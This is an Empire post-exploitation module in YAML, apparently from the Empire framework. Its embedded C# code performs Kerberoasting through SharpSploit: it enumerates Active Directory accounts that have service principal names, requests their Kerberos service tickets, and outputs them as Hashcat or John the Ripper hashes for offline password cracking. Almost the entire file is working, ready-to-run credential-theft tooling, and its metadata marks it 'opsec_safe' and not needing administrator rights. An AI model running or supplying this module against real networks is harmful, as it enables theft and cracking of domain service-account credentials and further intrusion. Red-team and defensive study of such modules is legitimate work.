name: Kerberoast
authors:
  - name: Anthony Rose
    handle: Cx01N
    link: https://twitter.com/Cx01N_
description: |
  This Empire module performs Kerberoasting by using SharpSploit’s DomainSearcher
  class to enumerate Active Directory user accounts with Service Principal Names (SPNs)
  and request their Kerberos TGS tickets. It parses the returned ticket data using
  the KerberosRequestorSecurityToken API and extracts usable credential material in
  either Hashcat or John the Ripper format.
software: ''
tactics: [TA0006]
techniques: [T1558.003]
background: true
output_extension: ''
needs_admin: false
opsec_safe: true
language: csharp
min_language_version: ''
options:
  - name: Usernames
    description: Username(s) to Kerberoast. Comma-delimited sAMAccountName list;
      DOMAIN\ prefix and @domain UPN suffix are accepted and stripped.
    required: true
    value: DOMAIN\username1,DOMAIN\username2
    strict: false
    suggested_values: []
  - name: HashFormat
    description: Format to output the hashes ("Hashcat" or "John").
    required: true
    value: Hashcat
    strict: false
    suggested_values:
      - Hashcat
      - John
csharp:
  UnsafeCompile: false
  CompatibleDotNetVersions:
    - Net35
    - Net40
  Code: |
    using System;
    using System.Text;
    using System.Linq;
    using System.Collections.Generic;
    using SharpSploit.Enumeration;

    public static class Program
    {
        public static void Main(string[] args)
        {
            string usernames = args.Length > 0 ? args[0] : null;
            string hashFormat = args.Length > 1 ? args[1] : null;
            string result = Kerberoast(usernames, hashFormat);
            Console.WriteLine(result);
        }

        public static string Kerberoast(string usernames = null, string hashFormat = null)
        {
            try
            {
                StringBuilder builder = new StringBuilder();
                List<Domain.SPNTicket> tickets;
                string ldapFilter = null;

                // SharpSploit's DomainSearcher.ConvertADName P/Invokes activeds.dll!Init,
                // which is not a flat export (it's an IADsNameTranslate COM method) and
                // throws EntryPointNotFoundException on modern Windows. Passing Identities
                // as null short-circuits ConvertIdentitiesToFilter and skips that path;
                // we translate usernames into an LDAPFilter ourselves.
                if (!string.IsNullOrEmpty(usernames) && usernames.Trim().Length > 0)
                {
                    ldapFilter = BuildSamAccountNameFilter(usernames);
                    if (ldapFilter == null)
                    {
                        // Every token stripped to empty. An empty LDAPFilter would silently
                        // widen to a domain-wide roast; refuse instead.
                        return "[!] Kerberoast: Usernames '" + usernames + "' parsed to zero valid sAMAccountName tokens; refusing to run an unfiltered domain-wide roast.";
                    }
                    // Cast disambiguates between Kerberoast(IEnumerable<string>, ...) and
                    // Kerberoast(string, ...); we need the IEnumerable overload so that null
                    // Identities short-circuits ConvertIdentitiesToFilter.
                    tickets = new Domain.DomainSearcher().Kerberoast((IEnumerable<string>)null, ldapFilter);
                }
                else
                {
                    tickets = new Domain.DomainSearcher().Kerberoast();
                }

                Domain.SPNTicket.HashFormat hf = (hashFormat?.ToLower() == "john" ? Domain.SPNTicket.HashFormat.John : Domain.SPNTicket.HashFormat.Hashcat);

                foreach (Domain.SPNTicket ticket in tickets)
                {
                    builder.AppendLine(ticket.GetFormattedHash(hf));
                }

                if (tickets.Count == 0)
                {
                    string target = ldapFilter != null ? "filter " + ldapFilter : "all SPN users";
                    builder.AppendLine("[*] No kerberoastable accounts matched " + target + ". Verify the target exists and has a servicePrincipalName set.");
                }

                return builder.ToString();
            }
            catch (Exception e)
            {
                return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace;
            }
        }

        private static string BuildSamAccountNameFilter(string usernames)
        {
            List<string> clauses = new List<string>();
            foreach (string raw in usernames.Split(','))
            {
                string token = raw.Trim();
                if (token.Length == 0) continue;

                // LastIndexOf (not IndexOf) so we strip the entire DOMAIN\ prefix even
                // if the tasking pipeline has delivered a doubled backslash.
                int backslash = token.LastIndexOf('\\');
                if (backslash >= 0) token = token.Substring(backslash + 1);

                int at = token.IndexOf('@');
                if (at >= 0) token = token.Substring(0, at);

                if (token.Length == 0) continue;

                clauses.Add("(samaccountname=" + EscapeLdapValue(token) + ")");
            }

            if (clauses.Count == 0) return null;
            if (clauses.Count == 1) return clauses[0];
            return "(|" + string.Concat(clauses) + ")";
        }

        private static string EscapeLdapValue(string value)
        {
            StringBuilder sb = new StringBuilder(value.Length);
            foreach (char c in value)
            {
                switch (c)
                {
                    case '\\': sb.Append("\\5c"); break;
                    case '*':  sb.Append("\\2a"); break;
                    case '(':  sb.Append("\\28"); break;
                    case ')':  sb.Append("\\29"); break;
                    case '\0': sb.Append("\\00"); break;
                    default:   sb.Append(c); break;
                }
            }
            return sb.ToString();
        }
    }
  ReferenceSourceLibraries:
    - Name: SharpSploit
      Description: SharpSploit is a library for C# post-exploitation modules.
      Location: SharpSploit\SharpSploit\
      Language: CSharp
      CompatibleDotNetVersions:
        - Net35
        - Net40
      ReferenceAssemblies: []
      EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
